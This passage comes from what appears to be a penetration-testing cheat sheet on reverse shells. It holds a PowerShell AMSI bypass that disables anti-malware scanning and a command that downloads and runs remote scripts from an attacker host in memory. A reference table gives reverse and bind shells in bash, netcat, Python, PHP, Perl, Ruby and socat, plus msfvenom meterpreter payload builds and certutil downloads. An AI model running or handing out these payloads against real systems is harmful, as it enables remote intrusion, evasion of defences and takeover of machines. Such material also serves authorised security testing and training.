  [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
  ```

  ```powershell [Alternative — Download and Execute in Memory]
  powershell -nop -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/amsi_bypass.ps1'); IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/shell.ps1')"
  ```

  ::tip
  AMSI bypasses change frequently as Microsoft patches them. Always test your bypass in a lab before using it on an engagement.
  ::
  :::
::

## Complete Quick Reference

::collapsible

| Task | Command |
| ---- | ------- |
| **Listeners** | |
| Netcat listener | `nc -lvnp 4444` |
| Ncat SSL listener | `ncat --ssl -lvnp 4443` |
| Socat TTY listener | `socat file:\`tty\`,raw,echo=0 TCP-LISTEN:4444` |
| Metasploit handler | `use exploit/multi/handler; set PAYLOAD ...; exploit -j` |
| **Reverse Shells** | |
| Bash | `bash -i >& /dev/tcp/IP/PORT 0>&1` |
| Netcat (-e) | `nc -e /bin/bash IP PORT` |
| Netcat (no -e) | `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\|/bin/sh -i 2>&1\|nc IP PORT >/tmp/f` |
| Python 3 | `python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'` |
| PHP | `php -r '$s=fsockopen("IP",PORT);exec("/bin/sh -i <&3 >&3 2>&3");'` |
| PowerShell | `powershell -nop -ep bypass -c "$c=New-Object Net.Sockets.TCPClient('IP',PORT)..."` |
| Perl | `perl -e 'use Socket;$i="IP";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'` |
| Ruby | `ruby -rsocket -e 'f=TCPSocket.open("IP",PORT).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'` |
| Socat (encrypted) | `socat OPENSSL:IP:PORT,verify=0 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane` |
| **Bind Shells** | |
| Netcat bind | `nc -lvnp 4444 -e /bin/bash` |
| Python bind | `python3 -c '...s.bind(("0.0.0.0",4444));s.listen(1);...'` |
| Connect to bind | `nc -nv TARGET_IP 4444` |
| **Shell Upgrades** | |
| Spawn PTY | `python3 -c 'import pty;pty.spawn("/bin/bash")'` |
| Background shell | :kbd{value="Ctrl"} + :kbd{value="Z"} |
| Full TTY | `stty raw -echo; fg` |
| Fix terminal | `export TERM=xterm-256color; stty rows R cols C` |
| **msfvenom** | |
| Windows EXE | `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f exe -o shell.exe` |
| Linux ELF | `msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f elf -o shell.elf` |
| PHP | `msfvenom -p php/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f raw -o shell.php` |
| HTTPS (encrypted) | `msfvenom -p windows/x64/meterpreter/reverse_https LHOST=IP LPORT=443 -f exe -o shell.exe` |
| Bind shell | `msfvenom -p windows/x64/shell_bind_tcp LPORT=4444 -f exe -o bind.exe` |
| **File Transfers** | |
| Serve files | `python3 -m http.server 8000` |
| Download (Linux) | `wget http://IP:8000/file -O /tmp/file` |
| Download (Windows) | `certutil -urlcache -split -f http://IP:8000/file C:\file` |

::

::tip
The best shell is the one that **works**. Do not waste time crafting an elaborate Python payload when a simple `bash -i >& /dev/tcp/IP/PORT 0>&1` does the job. Start simple. Escalate complexity only when simple fails.

And always — **always** — start your listener before triggering your payload. A callback with no listener is a wasted exploit and a burned opportunity. :icon{name="i-lucide-terminal"}
::